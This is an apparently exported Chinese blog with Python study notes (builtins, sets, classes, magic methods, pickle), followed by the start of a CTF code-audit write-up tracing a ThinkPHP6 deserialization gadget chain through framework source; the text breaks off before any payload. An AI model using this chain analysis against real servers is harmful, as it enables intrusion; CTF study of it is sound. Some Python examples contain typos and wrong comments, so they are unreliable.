<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于判断给定的可迭代参数iterable中的所有元素是否都为TRUE，如果是返回True，否则返回False元素，除了是0，空，FALSE外都算TRUE</span></span><br><span class="line"><span class="comment">#函数等价于：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># all(iterable)</span></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment">#iterable 元组或者列表</span></span><br><span class="line"><span class="comment">#tip</span></span><br><span class="line"><span class="comment">#空元组、空列表返回值为True</span></span><br><span class="line"></span><br><span class="line">li = []</span><br><span class="line">tup = ()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#Trur</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#False</span></span><br><span class="line">tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(tup)) <span class="comment">#False</span></span><br></pre></td></tr></table></figure>

<p><code>any()</code>或的关系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于判断给定的可迭代参数iterable是否全部为False，则返回False，如果有一个True，则返回True</span></span><br><span class="line"><span class="comment">#函数等价于</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">any</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#例子</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">0</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(ant(li)) <span class="comment">#False</span></span><br><span class="line">li = [<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,false]</span><br></pre></td></tr></table></figure>

<p><code>sorted()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对所有可迭代的对象进行排序操作(list str tuple dict)</span></span><br><span class="line"><span class="comment">#和sort区别：</span></span><br><span class="line"><span class="comment">#sort是应用再list上的方法，sorted可以对所有可迭代对象进行排序操作</span></span><br><span class="line"><span class="comment">#list的sort方法返回的是对已经存在的列表进行操作，</span></span><br><span class="line">  <span class="comment">#而内建函数sorted方法返回的是一个新的list，而不是在原来的基础上进行的</span></span><br><span class="line"><span class="comment">#语法：</span></span><br><span class="line"><span class="comment"># sorted(iterable[,cmp[,key[,reverse]]])</span></span><br><span class="line"><span class="comment">#参数：</span></span><br><span class="line"><span class="comment">#cmp 比较函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0</span></span><br><span class="line"><span class="comment">#key 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中去，指定可迭代对象中的以恶搞元素来进行排序</span></span><br><span class="line"><span class="comment">#reverse 排序规则，reverse = True 降序，反之升序</span></span><br><span class="line"><span class="comment">#返回重新排序的列表</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li))  <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">True</span>)) <span class="comment">#[8, 6, 5, 3, 2, 1]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">False</span>)) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line">li.sort()</span><br><span class="line"><span class="built_in">print</span>(li) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br></pre></td></tr></table></figure>

<p><code>reverse()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于反向列表中的元素</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">li.reverse()</span><br><span class="line"><span class="built_in">print</span>(li)</span><br></pre></td></tr></table></figure>

<p><code>range()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个整数列表，一般用在for循环中</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">range</span>(start,stop[,step])</span><br></pre></td></tr></table></figure>

<p><code>zip()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用来打包的</span></span><br><span class="line">a = <span class="built_in">zip</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))</span><br><span class="line"><span class="comment"># [(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;)]</span></span><br><span class="line"></span><br><span class="line">s1 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">s2 = [<span class="string">&#x27;你&#x27;</span>,<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;他&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(s1,s2)))</span><br><span class="line"><span class="comment"># [(&#x27;a&#x27;, &#x27;你&#x27;), (&#x27;b&#x27;, &#x27;我&#x27;), (&#x27;c&#x27;, &#x27;他&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同序列中的数据根据索引一一对应，并组成元组，各个元组又组成一个列表，每个元组元素的个数由最短的序列决定</span></span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printBookInfo</span>():</span></span><br><span class="line">    books = [] </span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入图书编号: &quot;</span>).split</span><br><span class="line">    bookName = <span class="built_in">input</span>(<span class="string">&quot;请输入书名:&quot;</span>)</span><br><span class="line">    bookPos = <span class="built_in">input</span>(<span class="string">&quot;请输入位置:&quot;</span>)</span><br><span class="line">    idList = <span class="built_in">id</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookNameList = bookName.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    posList = bookPos.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookInfo = <span class="built_in">zip</span>(idList, bookNameList, posList)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bookInfo:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        遍历图书信息，进行存储</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dictInfo = &#123;<span class="string">&#x27;编号&#x27;</span>:item[<span class="number">0</span>],<span class="string">&#x27;书名&#x27;</span>:item[<span class="number">1</span>],<span class="string">&#x27;位置&#x27;</span>:item[<span class="number">2</span>]&#125;</span><br><span class="line">        books.append(dictInfo)</span><br><span class="line">        <span class="comment">#将字典对象添加到list容器中</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> books:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">printBookInfo()</span><br></pre></td></tr></table></figure>

<p><code>enumerate()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于将一个可遍历的数据对象组合为一个索引序列，同时列出数据和数据下标，一般用在for循环中</span></span><br><span class="line"><span class="comment"># enumerate(sequence,[start=0])</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(li, start=<span class="number">0</span>):</span><br><span class="line">     <span class="built_in">print</span>(i) <span class="comment">#索引加元素的元组类型</span></span><br><span class="line"> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(li):</span><br><span class="line">       <span class="built_in">print</span>(i, j) <span class="comment">#分别输出对应的值</span></span><br><span class="line">dictA = &#123;&#125;</span><br><span class="line">dictA[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">dictA[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;female&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment">#索引加键的元组类型</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="comment">#遍历字典</span></span><br><span class="line">    <span class="built_in">print</span>(i, j, dictA[j])</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-三元运算"><a href="#0x04-三元运算" class="headerlink" title="0x04:三元运算"></a>0x04:三元运算</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = 值1 if 条件 else 值2</span><br></pre></td></tr></table></figure>

<h5 id="0x05-set集合"><a href="#0x05-set集合" class="headerlink" title="0x05:set集合"></a>0x05:set集合</h5><p>set（集合）是python中的一种数据类型，是一个无序且不重复的元素集合</p>
<p>特点：</p>
<p>不支持索引和切片，是一个无序的且不重复的容器，类似于字典，但是只有key没有value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建集合方式：</span></span><br><span class="line"></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">se2 = <span class="built_in">set</span>(list1)</span><br></pre></td></tr></table></figure>

<p><code>集合操作函数</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add()</span></span><br><span class="line">set1 = <span class="built_in">set</span>()</span><br><span class="line">set1.add(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() 清空</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.clear()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference()  差集 set1中存在，set2中不存在</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection() 交集</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.intersection(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># union()  并集</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.union(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() 移除数据 从集合中拿数据并删除</span></span><br><span class="line"><span class="comment"># 移除最小的数据并将剩下的数据进行升序排序</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.pop()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># discard()</span></span><br><span class="line"><span class="comment"># update() 更新数据</span></span><br></pre></td></tr></table></figure>

<h3 id="7-面向对象"><a href="#7-面向对象" class="headerlink" title="7.面向对象"></a>7.面向对象</h3><h5 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01:介绍"></a>0x01:介绍</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">面向对象编程：将数据和函数绑定，进行封装，这样能够更快速地开发程序，减少重复代码的重写过程（关注设计思维</span><br><span class="line">————适合做大项目</span><br></pre></td></tr></table></figure>

<p><code>类和对象</code></p>
<p>对象是类的实例</p>
<h5 id="0x02-定义类"><a href="#0x02-定义类" class="headerlink" title="0x02:定义类"></a>0x02:定义类</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class Foo(object):</span></span><br><span class="line"><span class="comment">#    属性</span></span><br><span class="line"><span class="comment">#    方法列表</span></span><br><span class="line"><span class="comment">#    pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span> <span class="comment">#self关键字</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;吃饭&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = Person() <span class="comment">#进行实例化，a为对象</span></span><br><span class="line">a.eat() <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-实例方法、属性、静态方法、类方法"><a href="#0x03-实例方法、属性、静态方法、类方法" class="headerlink" title="0x03:实例方法、属性、静态方法、类方法"></a>0x03:实例方法、属性、静态方法、类方法</h5><p>实例方法：在类的内部，使用def关键字可以定义一个实例方法，与一般函数定义不同，类方法必须包含参数<code>self</code>，且为第一个参数</p>
<p>属性：在类的内部定义的变量（类属性</p>
<p>实例属性：定义在方法里面使用self引用的属性称之为实例属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    native_place=<span class="string">&#x27;&#x27;</span> <span class="comment">#直接写在类里面的变量为类属性</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#实例方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;eat action&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#静态方法</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;静态方法&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#类方法</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cm</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;类方法&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#初始化方法 （构造方法</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.name = <span class="string">&#x27;小明&#x27;</span> <span class="comment">#实例属性</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">p = Person()</span><br></pre></td></tr></table></figure>

<h5 id="0x04-魔术方法"><a href="#0x04-魔术方法" class="headerlink" title="0x04:魔术方法"></a>0x04:魔术方法</h5><p><a href="https://www.cnblogs.com/nmb-musen/p/10861536.html">python 魔术方法</a></p>
<p><a href="https://blog.csdn.net/weixin_44251004/article/details/86503238">常用的魔术方法</a></p>
<table>
<thead>
<tr>
<th>魔术方法</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>__new__</code></td>
<td>在对象实例化的时候最先调用的方法</td>
</tr>
<tr>
<td><code>__init__</code></td>
<td>构造方法</td>
</tr>
<tr>
<td><code>__del__</code></td>
<td>析构方法</td>
</tr>
<tr>
<td><code>__call__</code></td>
<td>当对象被当作函数调用的时候自动调用此方法</td>
</tr>
<tr>
<td><code>__len__</code></td>
<td>当对象被当作len()调用的时候</td>
</tr>
<tr>
<td><code>__repr__</code></td>
<td>当对象被当作repr()调用的时候</td>
</tr>
<tr>
<td><code>__str__</code></td>
<td>当对象被当作str()调用的时候</td>
</tr>
<tr>
<td><code>__bytes__</code></td>
<td>当对象被当作bytes()调用的时候</td>
</tr>
<tr>
<td><code>__hash__</code></td>
<td>当对象被当作hash()调用的时候</td>
</tr>
<tr>
<td><code>__bool__</code></td>
<td>当对象被当作bool()调用的时候，应该返回true或false</td>
</tr>
<tr>
<td><code>__format__</code></td>
<td>当对象被当作format()调用的时候</td>
</tr>
<tr>
<td><code>__getattr__</code></td>
<td>当调用一个不存在的属性的时候执行的行为</td>
</tr>
<tr>
<td><code>__getattribute__</code></td>
<td>当该类的属性被访问时所执行的行为</td>
</tr>
<tr>
<td><code>__setattr__</code></td>
<td>定义当一个属性被设置时的行为</td>
</tr>
<tr>
<td><code>__delattr__</code></td>
<td>定义当一个属性被删除时的行为</td>
</tr>
<tr>
<td><code>__dir__</code></td>
<td>当对象被当作dir()调用时的行为</td>
</tr>
<tr>
<td><code>__get__</code></td>
<td>定义当描述符的值被取得时的行为</td>
</tr>
<tr>
<td><code>__reduce__</code></td>
<td>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）</td>
</tr>
</tbody></table>
<p><strong>简单运用</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="string">&#x27;ameuu&#x27;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是构造方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是析构方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;对象被当作函数调用&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用了一个不存在的属性&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        student = Person()</span><br><span class="line">        <span class="comment"># pop = base64.b64encode(_pickle.dumps(student))</span></span><br><span class="line">        <span class="comment"># print(pop)</span></span><br><span class="line">        student()</span><br><span class="line">        student.a</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Pickle</code>的<code>dumps</code>和<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>语言学习</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2022/03/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><ul>
<li>thinkphp6 序列化反序列化漏洞</li>
</ul>
<p><code>/public</code><br>发现有<code>www.jpg</code>，所以就试着会不会有源码泄露，直接访问<code>www.zip</code>得到源码</p>
<span id="more"></span>

<p><strong>0x01:</strong><br>在<code>app/controller/index.php</code>里面发现反序列化函数，那么有可能可以利用<br><img src="https://img-blog.csdnimg.cn/31b03b3093fb467184b53bf71cd3ff9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后就可以找一下链子，可以从<code>__destruct</code>,<code>__tostring</code>,<code>__call</code>等魔术方法</p>
<p>记录一下：</p>
<p>1.先试一下<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Abstractcache.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存session数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看了一圈之后，因为不是很懂<code>namespace</code>和<code>use</code>关键字的用法，所以先去查了一下</p>
<p>2.再回来看，感觉<code>Abstractcache.php</code>不可利用，所以就先去观察一下<code>Model.php</code>吧，先去跟踪一下save函数</p>
<p><code>Model/save()</code>，isEmpty函数要求<code>$this-&gt;data</code>不为空，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setAttrs(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment"># 要求$this-&gt;data不为空，并且 $this-&gt;withEvent为true</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData(<span class="variable">$sequence</span>);</span><br><span class="line">    	<span class="comment"># 进入 updateData 所以$this-&gt;exits为true</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入回调</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;AfterWrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新记录原始数据</span></span><br><span class="line">        <span 